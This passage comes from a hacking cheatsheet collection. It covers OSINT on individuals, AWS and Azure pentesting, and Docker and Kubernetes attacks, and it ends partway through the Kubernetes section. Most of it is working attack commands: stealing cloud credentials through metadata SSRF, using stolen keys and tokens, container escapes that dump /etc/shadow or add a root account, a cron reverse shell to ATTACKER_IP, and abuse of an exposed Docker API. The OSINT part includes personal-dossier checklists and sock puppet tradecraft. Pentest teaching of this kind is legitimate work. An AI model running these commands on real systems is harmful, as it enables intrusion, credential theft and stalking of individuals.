3. Social Catfish - Reverse image for social
```

---

## 🔎 OSINT — Target: [Full Name]

### Basic Information
□ Full legal name
□ Date of birth
□ Current address
□ Phone numbers
□ Email addresses

### Online Presence
□ LinkedIn profile
□ Facebook profile
□ Twitter/X account
□ Instagram
□ TikTok
□ Other social media
□ Personal website/blog

### Professional
□ Current employer
□ Job title
□ Work history
□ Education
□ Professional licenses
□ Publications/Patents

### Records
□ Property records
□ Court records
□ Business registrations
□ Voter registration
□ Marriage/Divorce records

### Connections
□ Family members
□ Associates
□ Business partners
□ Social connections
```

---

## 🔎 OSINT — ⚠️ Legal & Ethical Considerations

```
✓ Only use publicly available information
✓ Respect privacy laws (GDPR, CCPA)
✓ Don't impersonate or deceive
✓ Document your methodology
✓ Use for legitimate purposes only
✗ Don't stalk or harass
✗ Don't access private accounts
✗ Don't share findings publicly without consent
```

---

**Back to OSINT:** [🔍 OSINT Overview](./README.md)

## 🔎 OSINT — # 🔍 OSINT (Open Source Intelligence) Cheatsheet

```
 ██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║   ██║╚════██║██║██║╚██╗██║   ██║   
╚██████╔╝███████║██║██║ ╚████║   ██║   
 ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
```

> **Open Source Intelligence** - Collecting and analyzing publicly available information.

---

## 🔎 OSINT — 📑 Table of Contents

| Topic | Description | Guide |
|-------|-------------|-------|
| **People Search** | Find information about individuals | [📄 View](./People-Search.md) |
| **Email OSINT** | Email reconnaissance & verification | [📄 View](./Email-OSINT.md) |
| **Social Media** | Social media investigation | [📄 View](./Social-Media-OSINT.md) |
| **Domain & IP** | Domain/IP reconnaissance | [📄 View](./Domain-IP-OSINT.md) |
| **Image OSINT** | Reverse image search & analysis | [📄 View](./Image-OSINT.md) |

---

## 🔎 OSINT — 🎯 OSINT Methodology

```
┌─────────────────────────────────────────────────────────────┐
│                    OSINT LIFECYCLE                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. REQUIREMENTS    →  Define intelligence needs            │
│         ↓                                                   │
│  2. COLLECTION      →  Gather raw data from sources         │
│         ↓                                                   │
│  3. PROCESSING      →  Convert data to usable format        │
│         ↓                                                   │
│  4. ANALYSIS        →  Evaluate and correlate findings      │
│         ↓                                                   │
│  5. DISSEMINATION   →  Report and present intelligence      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔎 OSINT — 🛠️ Essential OSINT Tools

### Search Engines
| Tool | URL | Purpose |
|------|-----|---------|
| **Google** | google.com | General search |
| **Bing** | bing.com | Alternative search |
| **DuckDuckGo** | duckduckgo.com | Privacy-focused |
| **Yandex** | yandex.com | Russian search (good for images) |
| **Baidu** | baidu.com | Chinese search |

### People Search
| Tool | URL | Purpose |
|------|-----|---------|
| **Pipl** | pipl.com | Deep people search |
| **Spokeo** | spokeo.com | US people search |
| **WhitePages** | whitepages.com | Phone/Address lookup |
| **ThatsThem** | thatsthem.com | Free people search |
| **BeenVerified** | beenverified.com | Background checks |

### Email Tools
| Tool | URL | Purpose |
|------|-----|---------|
| **Hunter.io** | hunter.io | Find company emails |
| **Have I Been Pwned** | haveibeenpwned.com | Breach checking |
| **EmailRep** | emailrep.io | Email reputation |
| **Phonebook.cz** | phonebook.cz | Email/domain search |
| **h8mail** | GitHub | Breach credential search |

### Social Media
| Tool | URL | Purpose |
|------|-----|---------|
| **Sherlock** | GitHub | Username search |
| **Social Searcher** | social-searcher.com | Social media search |
| **Namechk** | namechk.com | Username availability |
| **KnowEm** | knowem.com | Username check |

### Domain/IP Tools
| Tool | URL | Purpose |
|------|-----|---------|
| **Shodan** | shodan.io | Device search |
| **Censys** | censys.io | Internet scanning |
| **SecurityTrails** | securitytrails.com | DNS history |
| **ViewDNS** | viewdns.info | DNS tools |
| **BuiltWith** | builtwith.com | Technology profiler |

---

## 🔎 OSINT — 🔥 Quick Reference Commands

### theHarvester
```bash
# Email & subdomain gathering
theHarvester -d target.com -l 500 -b all

# Specific sources
theHarvester -d target.com -b google,linkedin,twitter

# Save to file
theHarvester -d target.com -b all -f results.html
```

### Sherlock (Username Search)
```bash
# Search all platforms
python3 sherlock.py username

# Specific sites
python3 sherlock.py username --site twitter instagram facebook

# Output to file
python3 sherlock.py username --output results.txt
```

### Maltego
```
# Transform types:
- Person to Email
- Email to Domain
- Domain to IP
- IP to Location
- Social Media profiles
```

### Recon-ng
```bash
# Start recon-ng
recon-ng

# Create workspace
workspaces create target_name

# Load modules
modules load recon/domains-hosts/hackertarget
modules load recon/contacts-credentials/hibp_breach

# Set target
options set SOURCE target.com

# Run module
run
```

---

## 🔎 OSINT — 📊 OSINT Categories

### Passive OSINT
```
No direct interaction with target:
- Search engines
- Social media
- Public records
- Archive.org
- WHOIS data
```

### Active OSINT
```
Some interaction with target:
- Port scanning
- DNS queries
- Web crawling
- Email verification
```

---

## 🔎 OSINT — 🔒 Operational Security (OPSEC)

### Best Practices
```
✓ Use VPN/Tor
✓ Create sock puppet accounts
✓ Use virtual machines
✓ Don't use personal accounts
✓ Clear cookies/cache regularly
✓ Use separate browser profiles
✓ Document everything
```

### Sock Puppet Accounts
```
- Use generated identities
- Consistent persona across platforms
- Aged accounts (more trusted)
- Believable profile details
- Don't link to real identity
```

---

## 🔎 OSINT — Target: [Name/Company/Domain]

### People
□ Full name variations
□ Phone numbers
□ Email addresses
□ Physical addresses
□ Social media profiles
□ Professional history
□ Education history
□ Photos/Images

### Company
□ Domain registration (WHOIS)
□ Technology stack
□ Employee list
□ Email format
□ Social media presence
□ News/Press releases
□ Financial information
□ Physical locations

### Technical
□ IP addresses
□ Subdomains
□ Open ports/services
□ DNS records
□ SSL certificates
□ Historical data
```

---

## 🔎 OSINT — 🔗 OSINT Frameworks

### OSINT Framework
```
https://osintframework.com/
- Organized by category
- Links to hundreds of tools
- Visual tree structure
```

### IntelTechniques
```
https://inteltechniques.com/tools/
- Michael Bazzell's tools
- Custom search tools
- Investigation workflows
```

---

## 🔎 OSINT — 📚 Related Guides in This Repo

- [Google Dorking](../Google-Dorking/README.md)
- [GitHub Dorking](../GitHub-Dorking/README.md)
- [Shodan](../Shodan/README.md)
- [Amass](../Amass/README.md)
- [Subfinder](../Subfinder/README.md)

---

**Back to Main:** [🔴 Hacking Cheatsheets](../README.md)

## ☁️ Cloud Security — # 🟠 AWS Pentesting Cheatsheet

```
 █████╗ ██╗    ██╗███████╗    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
██╔══██╗██║    ██║██╔════╝    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
███████║██║ █╗ ██║███████╗    ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
██╔══██║██║███╗██║╚════██║    ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
██║  ██║╚███╔███╔╝███████║    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
```

---

## ☁️ Cloud Security — 🪣 S3 Bucket Enumeration

### Finding S3 Buckets
```bash
# Using AWS CLI
aws s3 ls s3://bucket-name --no-sign-request
aws s3 ls s3://bucket-name --profile stolen-creds

# Brute force bucket names
# S3Scanner
pip install s3scanner
s3scanner scan --bucket-file buckets.txt

# CloudBrute
CloudBrute -d target.com -k aws -w wordlist.txt

# Using ffuf
ffuf -u "https://FUZZ.s3.amazonaws.com" -w wordlist.txt -mc 200,301,302,403
```

### Common S3 Bucket Names
```
target-backup
target-dev
target-prod
target-staging
target-internal
target-logs
target-assets
target-media
target-data
target-files
```

### S3 Bucket Permissions Check
```bash
# List bucket (no auth)
aws s3 ls s3://bucket-name --no-sign-request

# Download entire bucket
aws s3 sync s3://bucket-name ./local-folder --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# Try to upload (write access)
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

---

## ☁️ Cloud Security — 🔑 IAM Enumeration

### With Valid Credentials
```bash
# Configure credentials
aws configure --profile target
# or export directly
export AWS_ACCESS_KEY_ID=AKIAXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# Get current identity
aws sts get-caller-identity

# List users
aws iam list-users
aws iam list-groups
aws iam list-roles

# Get user policies
aws iam list-user-policies --user-name username
aws iam list-attached-user-policies --user-name username

# Get role policies
aws iam list-role-policies --role-name rolename
aws iam list-attached-role-policies --role-name rolename

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::123456789:policy/PolicyName
aws iam get-policy-version --policy-arn ARN --version-id v1
```

### Privilege Escalation Check
```bash
# Using Pacu (AWS exploitation framework)
python3 pacu.py
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# Common privesc paths:
# - iam:CreatePolicyVersion
# - iam:SetDefaultPolicyVersion
# - iam:PassRole + lambda/ec2
# - iam:CreateAccessKey
# - iam:CreateLoginProfile
# - iam:UpdateLoginProfile
# - iam:AttachUserPolicy
# - iam:AttachRolePolicy
# - sts:AssumeRole
```

---

## ☁️ Cloud Security — 📄 EC2 Metadata Service (IMDS)

### SSRF to Metadata
```bash
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (token required)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Useful metadata paths
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4
/latest/meta-data/iam/security-credentials/
/latest/user-data                              # Startup scripts (may contain secrets!)
/latest/dynamic/instance-identity/document
```

### Using Stolen Credentials
```bash
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxxxxx...

aws sts get-caller-identity
```

---

## ☁️ Cloud Security — ⚡ Lambda Functions

### Enumeration
```bash
# List functions
aws lambda list-functions --region us-east-1

# Get function details
aws lambda get-function --function-name FUNCTION_NAME

# Get function code
aws lambda get-function --function-name FUNCTION_NAME --query 'Code.Location' --output text | xargs curl -o function.zip

# Get environment variables (may contain secrets!)
aws lambda get-function-configuration --function-name FUNCTION_NAME
```

### Exploitation
```bash
# If you can update function code
aws lambda update-function-code --function-name FUNCTION_NAME --zip-file fileb://malicious.zip

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## ☁️ Cloud Security — 🗄️ Other AWS Services

### RDS (Databases)
```bash
# List databases
aws rds describe-db-instances

# Get snapshots (may be public!)
aws rds describe-db-snapshots --include-public
```

### EBS Snapshots
```bash
# List your snapshots
aws ec2 describe-snapshots --owner-ids self

# Find public snapshots by keyword
aws ec2 describe-snapshots --filters "Name=description,Values=*backup*" --owner-ids amazon
```

### Secrets Manager
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id SECRET_NAME
```

### SSM Parameters
```bash
# List parameters
aws ssm describe-parameters

# Get parameter value
aws ssm get-parameter --name PARAM_NAME --with-decryption
```

---

## ☁️ Cloud Security — 🛠️ AWS Pentesting Tools

### Pacu (Exploitation Framework)
```bash
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py

# Useful modules:
> run iam__enum_permissions
> run iam__privesc_scan
> run s3__bucket_finder
> run ec2__enum
> run lambda__enum
```

### Prowler (Security Audit)
```bash
git clone https://github.com/prowler-cloud/prowler
cd prowler
./prowler aws
```

### ScoutSuite
```bash
pip install scoutsuite
scout aws --profile target
```

---

## ☁️ Cloud Security — 📋 AWS Pentesting Checklist

```markdown
□ Enumerate S3 buckets (public/private)
□ Check for exposed credentials (GitHub, metadata)
□ Enumerate IAM users/roles/policies
□ Check for privilege escalation paths
□ Enumerate EC2 instances & security groups
□ Check Lambda functions for secrets
□ Enumerate RDS/databases
□ Check EBS/RDS snapshots (public)
□ Enumerate Secrets Manager / SSM Parameters
```

---

## ☁️ Cloud Security — 🔗 Related Cheatsheets

- [Azure Pentesting](./Azure-Pentesting.md)
- [GCP Pentesting](./GCP-Pentesting.md)
- [SSRF Attacks](../SSRF/README.md)

---

**Back to Overview:** [☁️ Cloud Security](./README.md)

## ☁️ Cloud Security — # 🔵 Azure Pentesting Cheatsheet

```
 █████╗ ███████╗██╗   ██╗██████╗ ███████╗    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
██╔══██╗╚══███╔╝██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
███████║  ███╔╝ ██║   ██║██████╔╝█████╗      ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══╝      ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
██║  ██║███████╗╚██████╔╝██║  ██║███████╗    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
```

---

## ☁️ Cloud Security — 🔐 Azure AD Enumeration

### Unauthenticated Enumeration
```bash
# Check if domain uses Azure AD
https://login.microsoftonline.com/TARGET.COM/.well-known/openid-configuration
https://login.microsoftonline.com/getuserrealm.srf?login=admin@TARGET.COM

# User enumeration (timing attack)
# Using o365creeper
python o365creeper.py -f emails.txt

# Using AADInternals (PowerShell)
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com
```

### With Valid Credentials
```powershell
# Install Az module
Install-Module Az -Force

# Login
Connect-AzAccount
# or with service principal
$cred = Get-Credential
Connect-AzAccount -Credential $cred -ServicePrincipal -TenantId "TENANT-ID"

# Get current context
Get-AzContext

# List subscriptions
Get-AzSubscription

# List resources
Get-AzResource

# List VMs
Get-AzVM

# List storage accounts
Get-AzStorageAccount
```

### Azure AD Graph
```powershell
# Connect to Azure AD
Connect-AzureAD

# List users
Get-AzureADUser -All $true

# List groups
Get-AzureADGroup -All $true

# List group members
Get-AzureADGroupMember -ObjectId "GROUP-ID"

# List applications
Get-AzureADApplication -All $true

# List service principals
Get-AzureADServicePrincipal -All $true

# Get user roles
Get-AzureADDirectoryRole
Get-AzureADDirectoryRoleMember -ObjectId "ROLE-ID"
```

---

## ☁️ Cloud Security — 🪣 Azure Blob Storage

### Enumeration
```bash
# Check for public blobs
https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list

# Common blob names
ffuf -u "https://FUZZ.blob.core.windows.net" -w wordlist.txt -mc 200,400

# Using Azure CLI
az storage blob list --account-name ACCOUNT --container-name CONTAINER --output table

# Download blobs
az storage blob download --account-name ACCOUNT --container-name CONTAINER --name FILE --file local.txt
```

### Anonymous Access Check
```bash
# Check container access level
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container"

# If public - list all blobs
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

### Tools
```bash
# MicroBurst
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target

# BlobHunter
python3 blobhunter.py -s storage_account_name
```

---

## ☁️ Cloud Security — 📄 Azure IMDS (Metadata)

### SSRF to Metadata
```bash
# Get instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token for different resources
resource=https://management.azure.com/           # Azure Resource Manager
resource=https://vault.azure.net                 # Key Vault
resource=https://storage.azure.com/              # Storage
resource=https://graph.microsoft.com/            # MS Graph
```

### Using Stolen Token
```powershell
# Use access token with Az module
$token = "eyJ0eXAi..."
Connect-AzAccount -AccessToken $token -AccountId "user@domain.com"

# Or with REST API
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers
```

---

## ☁️ Cloud Security — 🔑 Azure Key Vault

### Enumeration
```powershell
# List key vaults
Get-AzKeyVault

# Get vault details
Get-AzKeyVault -VaultName "VAULT-NAME"

# List secrets
Get-AzKeyVaultSecret -VaultName "VAULT-NAME"

# Get secret value
Get-AzKeyVaultSecret -VaultName "VAULT-NAME" -Name "SECRET-NAME" -AsPlainText

# List keys
Get-AzKeyVaultKey -VaultName "VAULT-NAME"

# List certificates
Get-AzKeyVaultCertificate -VaultName "VAULT-NAME"
```

---

## ☁️ Cloud Security — ⚡ Azure Functions

### Enumeration
```powershell
# List function apps
Get-AzFunctionApp

# Get function app details
Get-AzFunctionApp -ResourceGroupName "RG" -Name "FUNCTION-APP"

# List functions
az functionapp function list --name FUNCTION-APP --resource-group RG
```

### Get Function Keys (if access)
```bash
# Get host key
az functionapp keys list --name FUNCTION-APP --resource-group RG

# Get function key
az functionapp function keys list --name FUNCTION-APP --resource-group RG --function-name FUNCTION
```

---

## ☁️ Cloud Security — 🛠️ Azure Pentesting Tools

### AzureHound (BloodHound for Azure)
```bash
# Collect Azure AD data
./azurehound -u "user@domain.com" -p "password" list --tenant "TENANT-ID" -o output.json

# Import to BloodHound
# Upload output.json to BloodHound GUI
```

### ROADtools
```bash
# Install
pip install roadrecon roadlib

# Authentication
roadrecon auth -u user@domain.com -p password

# Gather data
roadrecon gather

# Start GUI
roadrecon gui
```

### MicroBurst
```powershell
Import-Module MicroBurst.psm1

# Enumerate blobs
Invoke-EnumerateAzureBlobs -Base company

# Enumerate subdomains
Invoke-EnumerateAzureSubDomains -Base company

# REST API recon
Get-AzDomainInfo -domain target.com
```

### PowerZure
```powershell
Import-Module PowerZure.psm1

# Get all info
Get-AzureTargets

# Privilege escalation check
Show-AzureKeyVaultContent
Get-AzureRunAsAccounts
Get-AzureRunbookContent
```

---

## ☁️ Cloud Security — 📋 Azure Pentesting Checklist

```markdown
□ Enumerate Azure AD (users, groups, apps)
□ Check for public blob storage
□ Enumerate VMs and networking
□ Check for exposed IMDS
□ Enumerate Key Vault secrets
□ Check Function Apps for secrets
□ Look for automation runbooks
□ Check for service principal credentials
□ Run AzureHound for attack paths
```

---

## ☁️ Cloud Security — 🔗 Related Cheatsheets

- [AWS Pentesting](./AWS-Pentesting.md)
- [GCP Pentesting](./GCP-Pentesting.md)
- [AD Attack Methodology](../AD-Attack-Methodology/README.md)

---

**Back to Overview:** [☁️ Cloud Security](./README.md)

## 📦 Container Security — # 🐳 Docker Pentesting Cheatsheet

```
██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗     ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝    ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
```

---

## 📦 Container Security — 🔍 Docker Enumeration

### From Inside Container
```bash
# Check if you're in a container
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv

# Environment info
env | grep -i docker
hostname
cat /etc/hosts

# Check mounted volumes
df -h
mount | grep -E "^/dev"
cat /proc/mounts

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Check for Docker socket
ls -la /var/run/docker.sock
ls -la /run/docker.sock
```

### From Host
```bash
# Docker info
docker version
docker info
docker system info

# List containers
docker ps -a

# List images
docker images

# Inspect container
docker inspect CONTAINER_ID

# Check container config
docker inspect --format='{{.Config}}' CONTAINER_ID
docker inspect --format='{{.HostConfig}}' CONTAINER_ID
```

---

## 📦 Container Security — 🚀 Container Escape Techniques

### 1. Privileged Container Escape
```bash
# Check if privileged
cat /proc/self/status | grep -i cap
# CapEff: 0000003fffffffff = privileged

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now access host at /mnt/host

# Alternative: use fdisk to find partition
fdisk -l
mount /dev/vda1 /mnt/host

# Add SSH key for persistence
mkdir -p /mnt/host/root/.ssh
echo "YOUR_SSH_KEY" >> /mnt/host/root/.ssh/authorized_keys
```

### 2. Docker Socket Escape
```bash
# Check for socket
ls -la /var/run/docker.sock

# If socket is mounted, escape via new container
docker -H unix:///var/run/docker.sock ps

# Create privileged container with host mount
docker -H unix:///var/run/docker.sock run -it --rm --privileged \
  -v /:/host alpine chroot /host bash

# Or directly execute on host
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine \
  chroot /host /bin/sh -c 'cat /etc/shadow'
```

### 3. CAP_SYS_ADMIN Escape
```bash
# Check for SYS_ADMIN
cat /proc/self/status | grep CapEff

# Create cgroup to escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output
EOF
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### 4. Sensitive Mount Escape
```bash
# If /etc is mounted
echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

# If /root/.ssh is accessible
echo "YOUR_SSH_KEY" >> /root/.ssh/authorized_keys

# If cron directories are mounted
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /etc/cron.d/shell
```

### 5. release_agent Escape
```bash
# Works when cgroup v1 and CAP_SYS_ADMIN
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo $t/c > $d/release_agent
echo "#!/bin/sh
$1 > $t/o" > /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```

---

## 📦 Container Security — 🔍 Docker Image Analysis

### Extract Image Contents
```bash
# Save image as tar
docker save IMAGE_NAME -o image.tar

# Extract
mkdir image_extracted
tar -xf image.tar -C image_extracted/

# Analyze layers
cd image_extracted
cat manifest.json | jq .

# Extract each layer
for layer in */layer.tar; do
    tar -tvf "$layer"
done
```

### Search for Secrets
```bash
# In image layers
find . -name "*.tar" -exec tar -tvf {} \; | grep -E "\.(pem|key|env|conf|config|json|yml|yaml)$"

# Extract and search
for layer in */layer.tar; do
    tar -xf "$layer" -C /tmp/search/
done
grep -rn "password\|api_key\|secret\|token" /tmp/search/

# Using Dive
dive IMAGE_NAME
# Interactive analysis of layers
```

### Trivy Scan
```bash
# Scan image for vulnerabilities
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan with secret detection
trivy image --scanners vuln,secret nginx:latest

# Output as JSON
trivy image -f json -o results.json nginx:latest
```

---

## 📦 Container Security — 🔐 Docker Daemon Exploitation

### Exposed Docker API (Port 2375/2376)
```bash
# Check if exposed
curl http://TARGET:2375/version
curl http://TARGET:2375/info

# List containers
curl http://TARGET:2375/containers/json

# Create malicious container
curl -X POST -H "Content-Type: application/json" \
  http://TARGET:2375/containers/create?name=pwned \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /etc/shadow > /output/shadow"],
    "Binds": ["/:/host"],
    "Privileged": true
  }'

# Start container
curl -X POST http://TARGET:2375/containers/pwned/start

# Or use docker directly
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run -it --rm -v /:/host alpine chroot /host
```

### Docker Registry Exploitation
```bash
# Check for registry (port 5000)
curl http://TARGET:5000/v2/

# List repositories
curl http://TARGET:5000/v2/_catalog

# List tags
curl http://TARGET:5000/v2/REPO_NAME/tags/list

# Get manifest
curl http://TARGET:5000/v2/REPO_NAME/manifests/TAG

# Pull and analyze image
docker pull TARGET:5000/REPO_NAME:TAG
```

---

## 📦 Container Security — 🛡️ Security Audit

### Docker Bench Security
```bash
# Run audit
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
./docker-bench-security.sh

# Or via Docker
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /usr/lib/systemd:/usr/lib/systemd \
  -v /etc:/etc --label docker_bench_security \
  docker/docker-bench-security
```

### Check Container Security Config
```bash
# Privileged check
docker inspect --format='{{.HostConfig.Privileged}}' CONTAINER

# Capabilities
docker inspect --format='{{.HostConfig.CapAdd}}' CONTAINER
docker inspect --format='{{.HostConfig.CapDrop}}' CONTAINER

# Network mode
docker inspect --format='{{.HostConfig.NetworkMode}}' CONTAINER

# PID namespace
docker inspect --format='{{.HostConfig.PidMode}}' CONTAINER

# User
docker inspect --format='{{.Config.User}}' CONTAINER

# Read-only rootfs
docker inspect --format='{{.HostConfig.ReadonlyRootfs}}' CONTAINER

# Seccomp profile
docker inspect --format='{{.HostConfig.SecurityOpt}}' CONTAINER
```

---

## 📦 Container Security — 🧪 Vulnerable Lab Setups

### Intentionally Vulnerable Containers
```bash
# Vulnerable Docker socket
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu

# Privileged container
docker run -it --rm --privileged ubuntu

# With SYS_ADMIN capability
docker run -it --rm --cap-add=SYS_ADMIN ubuntu

# Host network
docker run -it --rm --network=host ubuntu

# Host PID namespace
docker run -it --rm --pid=host ubuntu
```

---

## 📦 Container Security — 📋 Docker Pentesting Checklist

```markdown
□ Check if inside container (/.dockerenv, cgroups)
□ Enumerate capabilities (capsh --print)
□ Check for Docker socket mount
□ Check for privileged mode
□ Enumerate mounted volumes
□ Search for secrets in environment variables
□ Analyze Dockerfile / image layers
□ Check for exposed Docker API (2375/2376)
□ Check for exposed registries (5000)
□ Run Docker Bench Security
□ Attempt container escape if vulnerabilities found
```

---

## 📦 Container Security — 🔗 Related Cheatsheets

- [Kubernetes Pentesting](./Kubernetes-Pentesting.md)
- [Linux Privilege Escalation](../Linux-PrivEsc/README.md)

---

**Back to Overview:** [🐳 Container Security](./README.md)

## 📦 Container Security — # ☸️ Kubernetes Pentesting Cheatsheet

```
██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ██╗███████╗████████╗███████╗███████╗
██║ ██╔╝██║   ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝
█████╔╝ ██║   ██║██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗     ██║   █████╗  ███████╗
██╔═██╗ ██║   ██║██╔══██╗██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║   ██╔══╝  ╚════██║
██║  ██╗╚██████╔╝██████╔╝███████╗██║  ██║██║ ╚████║███████╗   ██║   ███████╗███████║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚══════╝
```

---

## 📦 Container Security — 🔍 Kubernetes Enumeration

### From Inside Pod
```bash
# Check if in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Service account token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# API server endpoint
env | grep KUBERNETES
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# Interact with API
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces \
  -H "Authorization: Bearer ${TOKEN}"
```

### Using kubectl
```bash
# Cluster info
kubectl cluster-info
kubectl version
kubectl get nodes -o wide

# Namespaces
